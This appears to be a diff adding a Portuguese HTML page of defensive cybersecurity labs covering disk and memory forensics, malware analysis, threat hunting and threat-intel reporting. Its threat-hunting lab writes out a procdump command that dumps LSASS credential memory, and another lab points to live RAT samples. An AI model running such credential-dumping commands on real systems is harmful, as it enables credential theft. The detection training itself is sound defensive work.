+<span class="code-comment">→ Revela pastas que o atacante abriu mesmo que deletadas</span>
+
+<span class="code-label">Results → Web Artifacts → Web Downloads</span>
+<span class="code-comment">→ O que foi baixado da internet?</span>
+<span class="code-comment">→ Arquivo executável baixado de domínio suspeito = vetor</span>
+
+<span class="code-label">Results → Extracted Content → Installed Programs</span>
+<span class="code-comment">→ Algum programa estranho instalado?</span>
+
+<span class="code-label">File Views → Deleted Files</span>
+<span class="code-comment">→ Atacantes deletam ferramentas após uso — mas deixam rastros no disco</span></pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">4</div><div class="step-label">Monte a timeline do incidente</div></div>
+            <div class="step-body">
+              O Autopsy tem uma funcionalidade de Timeline que mostra todos os eventos do sistema em ordem cronológica:
+              <div class="code-block"><pre><span class="code-value">1.</span> No Autopsy: Tools → Timeline
+<span class="code-value">2.</span> Selecione o intervalo de tempo onde você suspeita que o incidente ocorreu
+<span class="code-value">3.</span> Observe os picos de atividade — horários fora do comum
+<span class="code-value">4.</span> Procure por:
+   - Arquivo executável criado/modificado
+   - Seguido de atividade em pasta System32 ou Temp
+   - Seguido de criação de arquivos suspeitos
+   - Seguido de modificação no Registro</pre></div>
+              <div class="box-warn">
+                <strong>Dica prática:</strong> Em incidentes reais, você geralmente tem um horário de referência (quando o usuário reportou o problema, ou quando o antivírus detectou algo). Use esse horário como ponto de partida e olhe 24–48h antes para encontrar o vetor inicial.
+              </div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">5</div><div class="step-label">Use as Eric Zimmerman Tools para análise mais rápida</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># Baixe em: ericzimmerman.github.io — todas gratuitas</span>
+<span class="code-comment"># Ferramentas específicas que você vai usar muito:</span>
+
+<span class="code-label">MFTECmd.exe</span>  <span class="code-comment"># Analisa a Master File Table (histórico de todos os arquivos)</span>
+<span class="code-cmd">MFTECmd.exe -f C:\caminho\$MFT --csv C:\saida\</span>
+
+<span class="code-label">PECmd.exe</span>    <span class="code-comment"># Analisa Prefetch — quais executáveis rodaram e quando</span>
+<span class="code-cmd">PECmd.exe -d C:\Windows\Prefetch --csv C:\saida\</span>
+
+<span class="code-label">LECmd.exe</span>    <span class="code-comment"># Analisa arquivos LNK — quais arquivos foram abertos</span>
+<span class="code-cmd">LECmd.exe -d "C:\Users\User\AppData\Roaming\Microsoft\Windows\Recent" --csv C:\saida\</span></pre></div>
+              Abra os CSVs gerados no Timeline Explorer (também do EZ) para visualizar em ordem cronológica.
+            </div>
+          </div>
+
+        </div>
+
+        <div class="aprendeu">
+          <div class="aprendeu-title">✓ Você aprendeu</div>
+          <div class="aprendeu-item">Como abrir e analisar uma imagem forense no Autopsy</div>
+          <div class="aprendeu-item">Quais artefatos respondem cada pergunta de IR (quem/o quê/quando/como)</div>
+          <div class="aprendeu-item">Como montar uma timeline de incidente a partir de artefatos do disco</div>
+          <div class="aprendeu-item">Como usar as EZ Tools para extração rápida de artefatos críticos</div>
+        </div>
+      </div>
+    </div>
+
+
+    <div id="lab-9" class="lab">
+      <div class="lab-header" onclick="toggleLab(this)">
+        <span class="lab-num lab-num-forense">LAB 9</span>
+        <div class="lab-title-block">
+          <div class="lab-title">Forense de Memória RAM — encontre malware fileless</div>
+          <div class="lab-meta">// Volatility 3, processos injetados, credenciais · ~3h</div>
+        </div>
+        <span class="lab-toggle">▾</span>
+      </div>
+      <div class="lab-body">
+        <div class="objetivo">
+          <strong>Objetivo:</strong> Analisar um dump de memória RAM usando Volatility 3 para encontrar processos maliciosos injetados, conexões ativas e strings suspeitas. Malware moderno não deixa rastro no disco — só na memória.
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">1</div><div class="step-label">Baixe um dump de memória de prática</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># Opção 1: CyberDefenders — labs com dump de memória incluso</span>
+<span class="code-comment"># Labs recomendados: "MemLabs", "DumpMe", "AfricanFalls"</span>
+
+<span class="code-comment"># Opção 2: MemLabs no GitHub</span>
+<span class="code-comment"># github.com/stuxnet999/MemLabs — 6 casos com dump de memória</span>
+<span class="code-comment"># Comece com o Case 1 — tem nível iniciante com gabarito</span></pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">2</div><div class="step-label">Instale o Volatility 3</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># Volatility 3 roda em Python — instale no WSL Ubuntu ou direto no Windows</span>
+<span class="code-cmd">git clone https://github.com/volatilityfoundation/volatility3.git</span>
+<span class="code-cmd">cd volatility3</span>
+<span class="code-cmd">pip3 install -r requirements.txt</span>
+
+<span class="code-comment"># Teste a instalação:</span>
+<span class="code-cmd">python3 vol.py -h</span></pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">3</div><div class="step-label">Comandos essenciais do Volatility — faça cada um</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># Substitua memory.dmp pelo nome do seu arquivo de dump</span>
+
+<span class="code-comment">## PASSO 1: Liste todos os processos em execução no momento do dump</span>
+<span class="code-cmd">python3 vol.py -f memory.dmp windows.pslist</span>
+<span class="code-comment"># O que procurar: processos com nomes estranhos, dois svchost.exe com pai diferente,</span>
+<span class="code-comment"># ou processos em caminhos incomuns</span>
+
+<span class="code-comment">## PASSO 2: Veja a árvore de processos (pai → filho)</span>
+<span class="code-cmd">python3 vol.py -f memory.dmp windows.pstree</span>
+<span class="code-comment"># Procure: powershell.exe filho de Word, ou cmd.exe filho de processo suspeito</span>
+
+<span class="code-comment">## PASSO 3: Veja conexões de rede ativas no momento do dump</span>
+<span class="code-cmd">python3 vol.py -f memory.dmp windows.netstat</span>
+<span class="code-comment"># Procure: conexão ESTABLISHED para IP externo por processo inesperado</span>
+
+<span class="code-comment">## PASSO 4: Detecte injeção de código em processos (DLL injection)</span>
+<span class="code-cmd">python3 vol.py -f memory.dmp windows.malfind</span>
+<span class="code-comment"># malfind encontra regiões de memória com código executável injetado</span>
+<span class="code-comment"># Saída: PID, endereço de memória, e o código injetado em hex</span>
+
+<span class="code-comment">## PASSO 5: Extraia strings de um processo suspeito</span>
+<span class="code-cmd">python3 vol.py -f memory.dmp windows.strings --pid 1234</span>
+<span class="code-comment"># Substitua 1234 pelo PID do processo suspeito</span>
+<span class="code-comment"># Procure: URLs, IPs, paths de arquivo, strings de C2</span></pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">4</div><div class="step-label">Correlacione o que você encontrou</div></div>
+            <div class="step-body">
+              <div class="box-suspicious">
+                <div class="box-title">Indicadores de comprometimento na memória</div>
+                <div class="box-item">Processo com nome legítimo (svchost.exe) mas rodando em caminho errado (C:\Users\... ao invés de C:\Windows\System32)</div>
+                <div class="box-item">malfind retorna resultado para processo legítimo — código foi injetado</div>
+                <div class="box-item">Strings contendo URLs com IP ao invés de domínio (C2 direto por IP)</div>
+                <div class="box-item">netstat mostrando conexão ESTABLISHED de lsass.exe ou winlogon.exe para IP externo</div>
+                <div class="box-item">Processo sem PPID válido (órfão) — técnica de evasão</div>
+              </div>
+              Se você encontrou um processo suspeito, extraia o executável da memória para análise:
+              <div class="code-block"><pre><span class="code-cmd">python3 vol.py -f memory.dmp windows.dumpfiles --pid 1234 --output-dir ./extraido/</span>
+<span class="code-comment"># Depois submeta o arquivo extraído ao VirusTotal</span></pre></div>
+            </div>
+          </div>
+
+        </div>
+
+        <div class="aprendeu">
+          <div class="aprendeu-title">✓ Você aprendeu</div>
+          <div class="aprendeu-item">Como analisar um dump de memória com os 5 comandos essenciais do Volatility</div>
+          <div class="aprendeu-item">O que é malware fileless e por que forense de memória é indispensável</div>
+          <div class="aprendeu-item">Como detectar DLL injection com malfind</div>
+          <div class="aprendeu-item">Como extrair executáveis injetados da memória para análise</div>
+        </div>
+      </div>
+    </div>
+
+
+    <!-- ===================== MALWARE ===================== -->
+    <div id="lab-10" class="section-break">
+      <div class="section-break-tag">análise de malware</div>
+      <div class="section-break-title">Entenda o que o malware faz — sem engenharia reversa avançada</div>
+    </div>
+
+    <div class="lab">
+      <div class="lab-header" onclick="toggleLab(this)">
+        <span class="lab-num lab-num-malware">LAB 10</span>
+        <div class="lab-title-block">
+          <div class="lab-title">Análise de Malware — estática e dinâmica</div>
+          <div class="lab-meta">// PEStudio, Any.run, sandbox · ~4h</div>
+        </div>
+        <span class="lab-toggle">▾</span>
+      </div>
+      <div class="lab-body">
+        <div class="objetivo">
+          <strong>Objetivo:</strong> Analisar uma amostra de malware real (em ambiente seguro) usando análise estática (sem executar) e dinâmica (em sandbox). Você vai entender o que o malware faz, gerar IOCs e criar detecções.
+        </div>
+        <div class="box-warn">
+          <strong>Segurança:</strong> Análise estática (PEStudio, hashes) pode ser feita na sua máquina normal. Análise dinâmica (executar o malware) SOMENTE em sandbox online (Any.run, Cuckoo) ou na VM isolada sem internet. NUNCA execute malware na sua máquina principal.
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">1</div><div class="step-label">Baixe uma amostra de malware (seguro)</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># Repositórios de malware para pesquisa — acesse pelo browser</span>
+
+<span class="code-label">MalwareBazaar</span>      → bazaar.abuse.ch
+<span class="code-comment"># Clique em Browse → filtre por tag "AgentTesla" ou "AsyncRAT" (RATs comuns)</span>
+<span class="code-comment"># Baixe uma amostra — vem em ZIP com senha "infected"</span>
+<span class="code-comment"># NÃO extraia fora da VM isolada</span>
+
+<span class="code-label">Alternativa mais segura:</span> Use amostras já analisadas no Any.run
+<span class="code-comment"># app.any.run → Public tasks → filtre por malware type</span>
+<span class="code-comment"># Você analisa a execução já registrada sem precisar executar você mesmo</span></pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">2</div><div class="step-label">Análise Estática com PEStudio</div></div>
+            <div class="step-body">
+              Baixe o PEStudio em <code>winitor.com</code>. Instale na VM ISOLADA. Arraste o executável malicioso para cima do PEStudio.
+              <div class="code-block"><pre><span class="code-comment"># O que observar no PEStudio:</span>
+
+<span class="code-label">Indicators (aba vermelha)</span>
+<span class="code-comment">→ O PEStudio já destaca automaticamente o que é suspeito</span>
+<span class="code-comment">→ Imports suspeitas: CreateRemoteThread, VirtualAllocEx, WriteProcessMemory</span>
+<span class="code-comment">   (essas funções são usadas para injeção de código em outros processos)</span>
+
+<span class="code-label">Strings</span>
+<span class="code-comment">→ Procure: URLs, IPs, nomes de arquivo, chaves de registry</span>
+<span class="code-comment">→ Base64 strings longas = dados codificados (configuração, C2)</span>
+<span class="code-comment">→ Strings como "cmd.exe", "powershell", "reg add" revelam intenção</span>
+
+<span class="code-label">Libraries / Imports</span>
+<span class="code-comment">→ WinINet.dll ou WinHTTP.dll = faz conexões HTTP (C2)</span>
+<span class="code-comment">→ Crypt32.dll = criptografia (ransomware, ou esconde C2 traffic)</span>
+<span class="code-comment">→ ws2_32.dll = conexões de socket (C2 raw)</span>
+
+<span class="code-label">VirusTotal (aba)</span>
+<span class="code-comment">→ PEStudio mostra o link direto do hash no VT</span>
+<span class="code-comment">→ 40/70 engines detectando = malware confirmado</span></pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">3</div><div class="step-label">Análise Dinâmica com Any.run (online, seguro)</div></div>
+            <div class="step-body">
+              Acesse <code>app.any.run</code> (plano gratuito disponível). Faça upload da amostra ou use uma já existente de análises públicas.
+              <div class="code-block"><pre><span class="code-comment"># O que observar no relatório do Any.run:</span>
+
+<span class="code-label">Process Tree</span>
+<span class="code-comment">→ A árvore de processos gerados pelo malware</span>
+<span class="code-comment">→ Igual ao que você aprendeu no Sysmon Lab 4</span>
+<span class="code-comment">→ Se o malware gera cmd.exe → powershell.exe → novo processo = red flag</span>
+
+<span class="code-label">Network Activity</span>
+<span class="code-comment">→ Quais IPs e domínios o malware tentou contatar</span>
+<span class="code-comment">→ Essas são os IOCs de rede para adicionar no SIEM como blocklist</span>
+
+<span class="code-label">File Activity</span>
+<span class="code-comment">→ Quais arquivos foram criados, modificados ou deletados</span>
+<span class="code-comment">→ Arquivos criados em %TEMP% com nome aleatório = dropper</span>
+
+<span class="code-label">Registry Activity</span>
+<span class="code-comment">→ Modificações no Registry — procure chaves de persistência:</span>
+<span class="code-comment">→ HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span>
+<span class="code-comment">→ HKLM\SYSTEM\CurrentControlSet\Services (novo serviço)</span>
+
+<span class="code-label">MITRE ATT&CK tab</span>
+<span class="code-comment">→ Any.run já mapeia o comportamento do malware nas técnicas MITRE</span>
+<span class="code-comment">→ Use isso para criar regras de detecção baseadas no que o malware faz</span></pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">4</div><div class="step-label">Documente os IOCs encontrados</div></div>
+            <div class="step-body">
+              Depois de analisar, crie um arquivo de IOCs:
+              <div class="code-block"><pre><span class="code-comment"># Template de documentação de IOCs (salve como iocs_sample_nome.txt)</span>
+
+<span class="code-label">AMOSTRA:</span>       agentesla_sample_20240115.exe
+<span class="code-label">SHA256:</span>        abc123def456... (hash do arquivo)
+<span class="code-label">FAMÍLIA:</span>       AgentTesla / AsyncRAT
+
+<span class="code-label">IOCs DE REDE:</span>
+  IP:            45.123.456.78  (C2 server)
+  Domínio:       evil-c2.ddns.net
+  Porta:         8080 (HTTP), 443 (HTTPS)
+
+<span class="code-label">IOCs DE HOST:</span>
+  Arquivo:       %TEMP%\msupdate.exe
+  Registry:      HKCU\...\Run → "WindowsUpdate" = C:\Temp\msupdate.exe
+  Mutex:         AgentTesla_Mutex_123
+
+<span class="code-label">MITRE ATT&CK:</span>
+  T1566.001 — Initial Access via Phishing
+  T1059.001 — PowerShell Execution
+  T1547.001 — Registry Run Key Persistence
+  T1041      — Exfiltration over C2</pre></div>
+              Esses IOCs vão direto para o seu SIEM como regras de detecção — fecha o ciclo completo.
+            </div>
+          </div>
+
+        </div>
+
+        <div class="aprendeu">
+          <div class="aprendeu-title">✓ Você aprendeu</div>
+          <div class="aprendeu-item">Análise estática: ler imports, strings e indicadores de um PE sem executar</div>
+          <div class="aprendeu-item">Análise dinâmica: interpretar um relatório de sandbox (processo, rede, arquivo, registry)</div>
+          <div class="aprendeu-item">Como extrair e documentar IOCs para alimentar o SIEM</div>
+          <div class="aprendeu-item">Como mapear o comportamento do malware no MITRE ATT&CK</div>
+        </div>
+      </div>
+    </div>
+
+
+    <!-- ===================== HUNTING + INTEL ===================== -->
+    <div id="lab-11" class="section-break">
+      <div class="section-break-tag">threat hunting + threat intelligence</div>
+      <div class="section-break-title">Onde você quer chegar — caçando antes de detectar</div>
+    </div>
+
+    <div class="lab">
+      <div class="lab-header" onclick="toggleLab(this)">
+        <span class="lab-num lab-num-hunting">LAB 11</span>
+        <div class="lab-title-block">
+          <div class="lab-title">Threat Hunting — do MITRE ATT&CK à caça nos logs</div>
+          <div class="lab-meta">// hipóteses, queries, correlação · ~4h</div>
+        </div>
+        <span class="lab-toggle">▾</span>
+      </div>
+      <div class="lab-body">
+        <div class="objetivo">
+          <strong>Objetivo:</strong> Executar um hunting completo — escolher uma técnica MITRE, gerar o ataque no lab, e caçar nos logs sem ter um alerta prévio. Você vai encontrar o ataque pelos seus rastros.
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">1</div><div class="step-label">Escolha uma técnica MITRE para caçar</div></div>
+            <div class="step-body">
+              Acesse <code>attack.mitre.org</code>. Vá em Techniques → Credential Access → T1003 — OS Credential Dumping. Leia a descrição e as sub-técnicas. Essa é uma das técnicas mais usadas por ransomware.
+              <div class="code-block"><pre><span class="code-comment"># Nossa hipótese de hunting:</span>
+
+<span class="code-label">TÉCNICA MITRE:</span>  T1003.001 — LSASS Memory (dump de credenciais)
+<span class="code-label">DESCRIÇÃO:</span>     Atacante acessa o processo lsass.exe para extrair
+                hashes de senhas e credenciais em memória.
+<span class="code-label">FERRAMENTA:</span>    Mimikatz é a mais famosa. Procdump da Sysinternals
+                é usada para fazer dump do lsass de forma "legítima".
+
+<span class="code-label">HIPÓTESE:</span>      "Se um atacante tentou fazer dump do LSASS, eu vou encontrar
+                no Sysmon Event ID 10 (ProcessAccess) um processo acessando
+                lsass.exe com direitos de leitura de memória."</pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">2</div><div class="step-label">Gere o ataque no lab (de forma segura)</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># No PowerShell como Administrador na VM isolada</span>
+<span class="code-comment"># Use o Procdump (Sysinternals — ferramenta legítima, usada para dump)</span>
+<span class="code-comment"># Baixe de: docs.microsoft.com/sysinternals</span>
+
+<span class="code-cmd">.\procdump64.exe -ma lsass.exe lsass_dump.dmp</span>
+<span class="code-comment"># Isso cria um dump do processo lsass (onde ficam as credenciais)</span>
+<span class="code-comment"># Atacantes fazem isso para depois extrair hashes offline</span>
+<span class="code-comment"># NÃO vamos extrair os hashes — só gerar a atividade para detectar</span></pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">3</div><div class="step-label">Caça nos logs sem usar a regra pronta</div></div>
+            <div class="step-body">
+              No Kibana, sem usar filtros prontos — pense como um hunter:
+              <div class="code-block"><pre><span class="code-comment"># Query 1: Quem acessou o processo lsass? (Sysmon ID 10)</span>
+<span class="code-string">event.code: 10 AND winlog.event_data.TargetImage: *lsass*</span>
+
+<span class="code-comment"># Examine o resultado:</span>
+<span class="code-comment"># SourceImage = quem acessou (seu procdump64.exe)</span>
+<span class="code-comment"># GrantedAccess = que tipo de acesso (0x1fffff = full access = muito suspeito)</span>
+<span class="code-comment"># CallTrace = rastro da chamada de sistema (NTDLL → MaliciousDLL?)</span>
+
+<span class="code-comment"># Query 2: Verificação cruzada — arquivo .dmp criado?</span>
+<span class="code-string">event.code: 11 AND winlog.event_data.TargetFilename: *.dmp</span>
+
+<span class="code-comment"># Query 3: Qual processo criou o arquivo .dmp?</span>
+<span class="code-string">event.code: 1 AND winlog.event_data.Image: *procdump*</span></pre></div>
+              <div class="box-suspicious">
+                <div class="box-title">O que você encontrou — o que confirma o hunting</div>
+                <div class="box-item">ID 10: SourceImage inesperado acessando lsass.exe com GrantedAccess 0x1fffff</div>
+                <div class="box-item">ID 11: arquivo .dmp criado em pasta temp ou desktop</div>
+                <div class="box-item">ID 1: processo desconhecido ou em caminho suspeito criado antes do acesso</div>
+                <div class="box-item">Correlação temporal: os 3 eventos em sequência no mesmo minuto</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">4</div><div class="step-label">Documente o hunting e converta em regra permanente</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># Template de documentação de um hunting:</span>
+
+<span class="code-label">DATA:</span>          2024-01-15
+<span class="code-label">HUNTER:</span>        Seu nome
+<span class="code-label">HIPÓTESE:</span>      Atacante realizou dump de credenciais do LSASS
+<span class="code-label">TÉCNICA:</span>       MITRE T1003.001
+<span class="code-label">FONTE DE DADOS:</span> Sysmon Event ID 10, 11, 1
+
+<span class="code-label">RESULTADO:</span>    VERDADEIRO POSITIVO — encontrado procdump acessando lsass
+<span class="code-label">EVIDÊNCIAS:</span>   IDs dos eventos encontrados, timestamp, SourceImage, GrantedAccess
+
+<span class="code-label">AÇÃO:</span>         Converter hipótese em regra Sigma permanente no SIEM
+<span class="code-label">FALSOS POSITIVOS MAPEADOS:</span> Windows Defender legítimo acessa lsass (filtrar)</span>
+
+<span class="code-label">PRÓXIMOS PASSOS:</span> Verificar outros hosts na rede com a mesma query</pre></div>
+            </div>
+          </div>
+
+        </div>
+
+        <div class="aprendeu">
+          <div class="aprendeu-title">✓ Você aprendeu</div>
+          <div class="aprendeu-item">O ciclo completo de Threat Hunting: hipótese → dados → evidência → regra</div>
+          <div class="aprendeu-item">Como detectar LSASS dumping — uma das técnicas mais usadas por ransomware</div>
+          <div class="aprendeu-item">Como correlacionar múltiplos Event IDs para confirmar uma atividade maliciosa</div>
+          <div class="aprendeu-item">Como documentar um hunting de forma profissional para portfólio</div>
+        </div>
+      </div>
+    </div>
+
+
+    <div id="lab-12" class="lab">
+      <div class="lab-header" onclick="toggleLab(this)">
+        <span class="lab-num lab-num-hunting">LAB 12</span>
+        <div class="lab-title-block">
+          <div class="lab-title">Threat Intelligence — analise um APT e escreva um relatório</div>
+          <div class="lab-meta">// portfólio para mercado internacional · ~5h</div>
+        </div>
+        <span class="lab-toggle">▾</span>
+      </div>
+      <div class="lab-body">
+        <div class="objetivo">
+          <strong>Objetivo:</strong> Produzir um relatório de Threat Intelligence real sobre um grupo APT conhecido. Esse relatório vai direto para o seu portfólio — é exatamente o que analistas de Threat Intel fazem no trabalho.
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">1</div><div class="step-label">Escolha um grupo APT para analisar</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># Grupos bons para começar (bastante documentação pública):</span>
+
+<span class="code-label">APT28 (Fancy Bear)</span>     <span class="code-comment">→ Russo, espionagem política, muito documentado</span>
+<span class="code-label">Lazarus Group</span>          <span class="code-comment">→ Norte-coreano, roubo financeiro e espionagem</span>
+<span class="code-label">APT41</span>                  <span class="code-comment">→ Chinês, espionagem + crime financeiro</span>
+<span class="code-label">Conti / Black Basta</span>    <span class="code-comment">→ Ransomware group, muito material público após leak</span>
+
+<span class="code-comment"># Recomendação: comece com Lazarus Group — tem muitos relatórios públicos</span>
+<span class="code-comment"># e cobre tanto espionagem quanto crime financeiro (tema relevante para AU/CA)</span></pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">2</div><div class="step-label">Colete fontes primárias sobre o grupo</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># Fontes de alta qualidade — acesse cada uma:</span>
+
+<span class="code-label">MITRE ATT&CK</span>
+  → attack.mitre.org/groups/G0032  (Lazarus Group)
+  → Lista todas as técnicas documentadas com referências
+
+<span class="code-label">CISA (US Gov)</span>
+  → cisa.gov → search "Lazarus Group" ou "APT38"
+  → Advisories oficiais com IOCs e TTPs
+
+<span class="code-label">Mandiant / Google TAG</span>
+  → mandiant.com/resources/blog
+  → cloud.google.com/blog/topics/threat-intelligence
+
+<span class="code-label">MISP Galaxy</span>
+  → misp-galaxy.org → APT groups
+  → Dados estruturados sobre o grupo
+
+<span class="code-label">GitHub — APT Notes</span>
+  → github.com/kbandla/APTnotes
+  → Coletânea de relatórios públicos sobre APTs</pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">3</div><div class="step-label">Mapeie as TTPs no ATT&CK Navigator</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-value">1.</span> Acesse: mitre-attack.github.io/attack-navigator/
+<span class="code-value">2.</span> Clique em "Open Existing Layer" → "From URL"
+<span class="code-value">3.</span> Cole a URL do layer do grupo no MITRE ATT&CK:
+   attack.mitre.org/groups/G0032/ → role até "ATT&CK Navigator Layers"
+<span class="code-value">4.</span> O Navigator vai mostrar um mapa visual de todas as técnicas usadas
+<span class="code-value">5.</span> Exporte como PNG para incluir no relatório</pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">4</div><div class="step-label">Escreva o relatório seguindo esse template</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># Template de relatório de Threat Intelligence:</span>
+
+<span class="code-label">1. SUMÁRIO EXECUTIVO</span> (1 parágrafo para gestores não técnicos)
+   "O grupo Lazarus, atribuído à Coreia do Norte, representa ameaça
+   a instituições financeiras e infraestrutura crítica..."
+
+<span class="code-label">2. ATRIBUIÇÃO E MOTIVAÇÃO</span>
+   - País/organização de origem (com grau de confiança)
+   - Motivação: espionagem / financeira / destrutiva
+   - Alvos históricos e setores afetados
+
+<span class="code-label">3. TÉCNICAS, TÁTICAS E PROCEDIMENTOS (TTPs)</span>
+   - Para cada fase da kill chain: o que o grupo faz
+   - Mapeamento MITRE ATT&CK com evidências
+   - Ferramentas exclusivas do grupo (se houver)
+   - [Inclua o screenshot do ATT&CK Navigator]
+
+<span class="code-label">4. INDICADORES DE COMPROMETIMENTO (IOCs)</span>
+   - IPs, domínios, hashes conhecidos (de fontes públicas)
+   - TTL de validade (IOCs de rede expiram rápido)
+
+<span class="code-label">5. RECOMENDAÇÕES DEFENSIVAS</span>
+   - Para cada TTP, qual detecção/mitigação aplicar
+   - Baseie nas mitigações do próprio MITRE ATT&CK
+
+<span class="code-label">6. REFERÊNCIAS</span>
+   - Liste todas as fontes usadas com data de acesso</pre></div>
+              <div class="box-warn">
+                <strong>Para o portfólio:</strong> Publique esse relatório no LinkedIn como artigo. Coloque o link no seu perfil como "Threat Intelligence Report — Lazarus Group Analysis". Recrutadores em Austrália e Canadá vão ver que você sabe produzir intel de verdade — não só passar em provas.
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+        <div class="aprendeu">
+          <div class="aprendeu-title">✓ Você aprendeu</div>
+          <div class="aprendeu-item">Como pesquisar um grupo APT usando fontes primárias (MITRE, CISA, Mandiant)</div>
+          <div class="aprendeu-item">Como usar o ATT&CK Navigator para visualizar e exportar o perfil de ameaça</div>
+          <div class="aprendeu-item">Como estruturar e escrever um relatório de Threat Intelligence profissional</div>
+          <div class="aprendeu-item">Como transformar esse trabalho em portfólio concreto para o mercado internacional</div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- end content -->
+</div><!-- end main -->
+
+<script>
+function toggleLab(header) {
+  const lab = header.parentElement;
+  lab.classList.toggle('open');
+}
+
+function scrollTo(id) {
+  const el = document.getElementById(id);
+  if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  // update active
+  document.querySelectorAll('.sidebar-link').forEach(l => l.classList.remove('active'));
+  event.currentTarget.classList.add('active');
+}
+
+// Highlight current section on scroll
+const sections = document.querySelectorAll('[id^="lab-"]');
+const links = document.querySelectorAll('.sidebar-link');
+
+window.addEventListener('scroll', () => {
+  let current = '';
+  sections.forEach(s => {
+    if (window.scrollY >= s.offsetTop - 100) current = s.id;
+  });
+  links.forEach(l => {
+    l.classList.remove('active');
+    if (l.getAttribute('onclick') && l.getAttribute('onclick').includes(current)) {
+      l.classList.add('active');
+    }
+  });
+});
+</script>
+</body>
+</html>
